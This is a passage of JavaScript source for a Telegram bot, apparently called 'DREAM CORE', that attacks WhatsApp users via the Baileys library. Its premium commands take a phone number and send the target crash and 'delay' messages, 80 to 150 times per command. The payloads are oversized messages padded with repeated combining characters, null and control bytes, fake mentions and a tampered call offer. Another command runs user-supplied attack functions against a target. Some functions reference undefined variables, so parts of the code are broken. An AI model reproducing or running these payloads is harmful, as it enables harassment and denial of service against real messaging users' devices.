  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Blank Clik Ios
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("forcelo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /forcelo 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Forclose By Maklo
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await KartuPy(sock, target);
    await sleep(400);
    await KartuPy(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Forclose By Maklo
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delaybulldo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delaybulldo 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Bulldo
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 130; i++) {
    await balabala(sock, target);
    await sleep(400);
    await VenDelay(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Bulldo
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("blankv1", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /blankv1 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Blank Clik V1
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 80; i++) {
    await SixbBlank(sock, target);
    await sleep(400);
    await RFPKatalis(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Blank Clik V1
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Invis Hard
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 150; i++) {
    await Abimzubreg(target);
    await sleep(400);
    await invisibleSpam(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Invis Hard
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: vidthumbnail },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Unknown Function
ﾒ.- Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Unknown Function
ﾒ.- Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: vidthumbnail },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

//Tempat Function
async function KartuPy(sock, target) {
let assertBlank = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  let MSG = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mimetype: "image/jpeg",
          caption: "-Kartu || Exploit" + "ꦾ".repeat(12000),
          fileSha256: Buffer.from("Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=", "base64"),
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: Buffer.from("n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", "base64"),
          fileEncSha256: Buffer.from("LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=", "base64"),
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: Date.now(),
          jpegThumbnail: null,
          scansSidecar: Buffer.from("mh5/YmcAWyLt5H2qzY3NtHrEtyM=", "base64"),
          scanLengths: [2437, 17332],
          contextInfo: {
            stanzaId: "fusion-" + Date.now(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              conversation: "ꦾ".repeat(5000)
            }
          }
        }
      }
    }
  }
  await sock.assertSessions(assertBlank);
   await sock.relayMessage(target, msg, {
     participant: { jid: target }, 
     });
}

async function callCrash(sock, target, isVideo = false) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
  
  try {
    const devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = sock.createParticipantNodes?.bind(sock);
    const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await sock.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await sock.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: sock.generateMessageTag(),
        from: sock.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": sock.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await sock.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}


async function YxGInfoNe(target) {
const Trash = {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "YxG - InfoNeCrash" + "ꦾ".repeat(60000) + "ꦽ".repeat(60000),
        url: "https://stickerPack/" + "ꦾ".repeat(9000),
        address: "Ngangkang" + "ꦾ".repeat(60000) + "ꦽ".repeat(60000),
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true,
            showAdAttribution: true,
            body: "YxG - Ngangkang Ajg" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
            title: "\u0000".repeat(10000),
            sourceUrl: "https://stickerPack/./" + "ꦾ".repeat(10000),
            thumbnailUrl: null,
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(10000),
              mediaType: 2,
              jpegThumbnail: "/9j/8HACE82HSGSI",
              caption: "YxG - Ish Ngeri Nyoo" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
            },
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCD1234567"
            }
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc",
                  mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                  fileName: "-hayy" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                  fileLength: "99999999999",
                  pageCount: -99999,
                  mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                  fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                  fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                  mediaKeyTimestamp: 1748420423,
                  directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc"
                }
              }
            }
          }
        }
      }
    }; 
    await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
  }
  
async function xndIOS(target) {
  await sock.relayMessage("status@broadcast", {
    extendedTextMessage: {
      text: `👁‍🗨⃟꙰。⌁ 𝟕𝐞𝐩 ‌𝐩𝐞𝐥 ‌⃰𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝   ⃟꙰👁‍🗨\nhttps://t.me/Zeppeli_Exposed\n${"𑇂𑆵𑆴𑆿".repeat(15000)}`, 
      matchedText: "https://t.me/Zeppeli_Exposed",
      description: "❓⃟꙰。⌁𝐖𝐞ˊ𝐫𝐞‌ 𝐀ˊ 𝐂˓𝐨𝐮𝐩ˏ𝐥𝐞𝐬‌⃰ 𝐑𝐢𝐠ˋ𝐡𝐭?. ⁉️⃟꙰",
      title: "🧪⃟꙰。⌁𝟕𝐞𝐩 ‌𝐩𝐞𝐥 ‌⃰𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝", 
      textArgb: Math.random() * 2000,
      backgroundArgb: Math.random() * 2000,
      font: "SYSTEM", 
      inviteLinkGroupType: "DEFAULT", 
      jpegThumbnail: ZeppImg, 
      contextInfo: {
        statusSourceType: "TEXT", 
        statusAttributionType: "RESHARED_FROM_MENTION", 
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: "7eppeli.pdf",
              songId: "1137812656623908",
              title: "𑇂𑆵𑆴𑆿".repeat(9000),
              author: "𑇂𑆵𑆴𑆿".repeat(9000),
              artistAttribution: "https://t.me/YuukeyD7eppeli",
              isExplicit: true
            }
          }
        ]
      }
    }
  }, {
    statusJidList: [target]
  });
}

async function invisibleSpam(sock, target) {
  for (let i = 0; i < 1; i++) {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "\u0003",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\x10".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    );
  }
  await new Promise(resolve => setTimeout(resolve, 1000));
}

async function R8Abim(target) {
  try {
    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            interactiveResponseMessage: {
              header: {
                interactiveButtons: [],
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(90000),
                buttons: [
                  { name: "payment_method", buttonParamsJson: {} },
                  { name: "payment_info", buttonParamsJson: {} },
                  { name: "payment_settings", buttonParamsJson: {} },
                  { name: "review_and_pay", buttonParamsJson: {} },
                  { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(90080) },
                  { name: "cta_url", buttonParamsJson: "\u0000".repeat(96000) },
                  { name: "cta_call", buttonParamsJson: "\u0000".repeat(9900) },
                  { name: "cta_copy", buttonParamsJson: "\u0003".repeat(8000) },
                  { name: "cta_reminder", buttonParamsJson: "\u0003".repeat(76000) },
                  { name: "cta_cancel_reminder", buttonParamsJson: "\u0003".repeat(95000) },
                  { name: "address_message", buttonParamsJson: "\u0003".repeat(95000) },
                  { name: "send_location", buttonParamsJson: "\u0003".repeat(98000) },
                  { name: "quick_reply", buttonParamsJson: "\u0003".repeat(90050) },
                  { name: "mpm", buttonParamsJson: "\u0003".repeat(97000) },
                ],
                version: 3,
              },
              nativeFlowMessage: {
                messageParamsJson: "{}",
                buttons: [
                  {
                    businessMessageForwardInfo: {
                      businessOwnerJid: "13135550002@s.whatsapp.net",
                    },
                    name: "payment_method",
                    buttonParamsJson: {
                      reference_id: null,
                      payment_method: "\u0010".repeat(80000),
                      payment_timestamp: null,
                      share_payment_status: true,
                    },
                  },
                  { name: "payment_method", buttonParamsJson: {} },
                  { name: "payment_info", buttonParamsJson: {} },
                  { name: "payment_settings", buttonParamsJson: {} },
                  { name: "review_and_pay", buttonParamsJson: {} },
                ],
              },
            },
          },
        },
      },
    };

    const msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            interactiveResponseMessage: {
              body: {
                text: "⏤>ADA DARK JANGAN⃟ ི꒦ LARI" + "ꦾ".repeat(95000),
              },
              nativeFlowMessage: {
                buttons: [
                  { name: "single_select", buttonParamsJson: "\u0000".repeat(90000) },
                  { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(98000) },
                  { name: "cta_url", buttonParamsJson: "\u0000".repeat(90000) },
                  { name: "cta_call", buttonParamsJson: "\u0000".repeat(98000) },
                  { name: "cta_copy", buttonParamsJson: "\u0003".repeat(5000) },
                  { name: "cta_reminder", buttonParamsJson: "\u0003".repeat(9000) },
                  { name: "cta_cancel_reminder", buttonParamsJson: "\u0003".repeat(95000) },
                  { name: "address_message", buttonParamsJson: "\u0003".repeat(9500) },
                  { name: "send_location", buttonParamsJson: "\u0003".repeat(9900) },
                  { name: "quick_reply", buttonParamsJson: "\u0003".repeat(80000) },
                  { name: "mpm", buttonParamsJson: "\u0003".repeat(95000) },
                ],
              },
            },
          },
        },
      },
    };

    for (const msg of [msg1, msg2]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                  },
                ],
              },
            ],
          },
        ],
      });
    }

    console.log(`[ DARK Sending To ${target} suksesfull 🧪 ]`);
  } catch (e) {
    console.error(e);
  }
}

async function delayhard2025(sock, target, mention) {
    console.log(chalk.red("⚙️ delayhard2025..."));

    const titid = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1945 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
)
    ];

    const payload = "\u0000".repeat(27152);

    for (let i = 0; i < 10; i++) {
        const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://files.catbox.moe/j5ogwy.png",
                        mimetype: "image/jpeg",
                        caption: "./xblaster",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: titid,
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: payload
                    }
                }
            }
        }, { userJid: target });
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await sock.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                fromMe: false,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "status@broadcast",
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "— \u9999" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        console.log(chalk.green(`[${i + 1}/10] ✅ delayhard2025 iteration done`));
    }

    console.log(chalk.yellow("✅ Finished delayhard2025!"));
}

async function OtaxAyunBelovedX(sock, target, mention) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "σƭαא Nih Boes", format: "DEFAULT" },
            nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
          version: 3
        },
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "999999"),
    }
  );

  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];

  let sequentialIndex = 0;
  console.log(chalk.red(`${target} 𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞 𝙀𝙬𝙚 𝙀𝙬𝙚 𝙊𝙡𝙚𝙝 𝙊𝙏𝘼𝙓 ⸙`));

  const selectedMedia = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia;

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from(
        { length: 2000 },
        () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
      ),
    ],
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
          version: 3
        },
        },
      },
    },
  };

const interxnxx = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
          name: "address_message",
